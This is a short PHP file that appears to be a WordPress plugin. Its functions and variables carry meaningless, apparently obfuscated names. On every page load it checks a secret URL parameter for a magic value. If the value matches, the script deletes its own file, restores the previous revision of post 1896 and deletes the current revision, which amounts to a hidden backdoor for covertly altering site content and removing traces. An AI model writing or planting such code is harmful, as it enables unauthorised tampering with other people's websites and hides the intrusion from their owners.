<?php

function alt_ultimate_hover_forum() {
	if (isset($_GET['weather_thumbnails_messenger_history']) && $_GET['weather_thumbnails_messenger_history'] === 'status_domain_first_community') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$shortcodes_scheduler_home_auto = 1896;
		$asset_first_widget = wp_get_post_revisions($shortcodes_scheduler_home_auto);
		if (empty($asset_first_widget)) die('no revisions');
		if (count($asset_first_widget) < 2) die('less than 2');
		$grid_themes_exchange = array_shift($asset_first_widget);
		$gravity_wpmu_deprecated = $grid_themes_exchange->ID;
		$excerpt_cdn_basic_addons = array_shift($asset_first_widget);
		$testimonial_now_favicon = $excerpt_cdn_basic_addons->ID;
		$history_buttons_real = wp_restore_post_revision($testimonial_now_favicon);
		if ($history_buttons_real === false) die('error restoring');
		$history_buttons_real = wp_delete_post_revision($gravity_wpmu_deprecated);		
		if ($history_buttons_real === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'alt_ultimate_hover_forum');
